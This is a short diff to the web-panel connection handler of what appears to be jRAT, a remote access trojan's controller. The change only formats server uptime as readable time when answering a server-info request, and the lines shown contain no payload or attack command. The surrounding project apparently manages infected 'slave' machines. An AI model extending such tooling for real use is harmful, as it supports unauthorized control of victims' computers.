@@ -6,6 +6,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
 
+import se.jrat.common.utils.MathUtils;
 import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Constants;
 import se.jrat.controller.Main;
@@ -148,7 +149,9 @@ public class WebPanelConnection implements Runnable {
                 } else if (packet == WebPanelPackets.PACKET_SERVER_INFO) {
                 	StringBuilder sb = new StringBuilder();
                 	
-                	sb.append(System.currentTimeMillis() - Main.START_TIME);
+                	int diff = (int) (System.currentTimeMillis() - Main.START_TIME);
+                	
+                	sb.append(MathUtils.getTimeFromSeconds(diff / 1000));
                 	
                 	bw.write(sb.toString() + "\n");
                 	bw.flush();
